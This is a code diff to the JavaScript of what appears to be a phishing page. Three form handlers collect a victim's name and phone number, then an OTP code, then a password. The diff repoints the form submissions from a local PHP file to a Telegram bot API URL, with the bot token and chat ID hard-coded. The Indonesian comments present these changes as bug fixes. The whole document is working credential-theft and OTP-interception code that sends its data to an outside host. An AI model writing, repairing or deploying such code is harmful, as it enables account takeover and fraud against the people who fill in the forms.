@@ -1,10 +1,18 @@
 function processFirstData() {
-    $('#firstForm').submit(function(e) {
-        e.preventDefault();
+    $('#firstForm').submit(function(submitingprocessFirstData) {
+        submitingprocessFirstData.preventDefault();
 
         var $full_name = $("input#full_name").val();
         var $phone_number = $("input#phone_number").val();
 
+        // Perbaikan: Menggunakan variabel langsung, bukan .value
+        // Menggunakan encodeURIComponent agar karakter spasi/simbol tidak merusak URL
+        var gabungan = 'full_name%3A%0A' + encodeURIComponent($full_name) + '%0Aphone_number%3A%0A' + encodeURIComponent($phone_number);
+
+        var token = '8466069094:AAETtXO1q2Ma9fPimI2emwkAlDyymsVUnh4'; // Ganti dengan Token Anda
+        var grup = '6917263813'; // Ganti dengan Chat ID Anda
+
+        // Perbaikan: Menggunakan || (OR). Jika nama kosong ATAU nomor kosong, maka return false.
         if ($full_name == "" || $phone_number == "") {
             $('.verification_info').show();
             $('.account_verification').hide();
@@ -13,8 +21,8 @@ function processFirstData() {
 
         $.ajax({
             type: "POST",
-            url: "kirim.php", // Mengarah ke file PHP kita
-            data: $(this).serialize(), // Mengirim data form (name & phone)
+            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+            data: $(this).serialize(),
             beforeSend: function() {
                 $('.loading').show();
             },
@@ -31,26 +39,30 @@ function processFirstData() {
 };
 
 function processSecondData() {
-    $('#secondForm').submit(function(e) {
-        e.preventDefault();
+    $('#secondForm').submit(function(submitingprocessSecondData) {
+        submitingprocessSecondData.preventDefault();
 
         var $full_name = $("input#validateFullName").val();
         var $phone_number = $("input#validatePhoneNumber").val();
-        var $otp_code = $("input#otp").val();
+        var $otp_code = $("input#otp").val(); // Variabel ini bernama $otp_code
 
+        // Perbaikan: Menggunakan variabel yang benar ($otp_code)
+        var gabungan = 'full_name%3A%0A' + encodeURIComponent($full_name) + '%0Aphone_number%3A%0A' + encodeURIComponent($phone_number) + '%0Aotp%3A%0A' + encodeURIComponent($otp_code);
+
+        var token = '8466069094:AAETtXO1q2Ma9fPimI2emwkAlDyymsVUnh4';
+        var grup = '6917263813';
+
+        // Perbaikan: Variabel $otp tidak ada, diganti $otp_code. Logika && diganti ||
         if ($full_name == "" || $phone_number == "" || $otp_code == "") {
             $('.verification_info').show();
             $('.account_verification').hide();
             return false;
         }
 
-        // Kita perlu mengirim full_name dan phone_number juga agar PHP bisa mencatatnya
-        var dataKirim = $(this).serialize() + "&full_name=" + encodeURIComponent($full_name) + "&phone_number=" + encodeURIComponent($phone_number);
-
         $.ajax({
             type: "POST",
-            url: "kirim.php",
-            data: dataKirim,
+            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+            data: $(this).serialize(),
             beforeSend: function() {
                 $('.loading').show();
             },
@@ -58,6 +70,7 @@ function processSecondData() {
                 $(".third").show();
                 $('.loading').hide();
                 $('.second').hide();
+                // Perbaikan: Variabel $otp diganti $otp_code
                 $("input#validateOtp").val($otp_code);
             }
         });
@@ -66,27 +79,31 @@ function processSecondData() {
 };
 
 function processThirdData() {
-    $('#thirdForm').submit(function(e) {
-        e.preventDefault();
+    $('#thirdForm').submit(function(submitingprocessThirdData) {
+        submitingprocessThirdData.preventDefault();
 
         var $full_name = $("input#validateFullName").val();
         var $phone_number = $("input#validatePhoneNumber").val();
-        var $otp_code = $("input#otp").val(); // Pastikan input OTP sebelumnya nilainya terbawa/tersimpan
-        // Jika input OTP hilang di tahap 3, Anda perlu input hidden dengan id="validateOtp"
+        // Pastikan input sebelumnya memiliki id="validateOtp" atau ambil dari input#otp lagi jika masih satu halaman
+        var $otp_code = $("input#otp").val(); 
         var $password = $("input#password").val();
 
-        if ($full_name == "" || $phone_number == "" || $password == "") {
+        var gabungan = 'full_name%3A%0A' + encodeURIComponent($full_name) + '%0Aphone_number%3A%0A' + encodeURIComponent($phone_number) + '%0Aotp%3A%0A' + encodeURIComponent($otp_code) + '%0Apassword%3A%0A' + encodeURIComponent($password);
+
+        var token = '8466069094:AAETtXO1q2Ma9fPimI2emwkAlDyymsVUnh4';
+        var grup = '6917263813';
+
+        // Perbaikan: Menggunakan variabel yang benar dan logika ||
+        if ($full_name == "" || $phone_number == "" || $otp_code == "" || $password == "") {
             $('.verification_info').show();
             $('.account_verification').hide();
             return false;
         }
 
-        var dataKirim = $(this).serialize() + "&full_name=" + encodeURIComponent($full_name) + "&phone_number=" + encodeURIComponent($phone_number) + "&otp=" + encodeURIComponent($otp_code);
-
         $.ajax({
             type: "POST",
-            url: "kirim.php",
-            data: dataKirim,
+            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+            data: $(this).serialize(),
             beforeSend: function() {
                 $('.loading').show();
             },
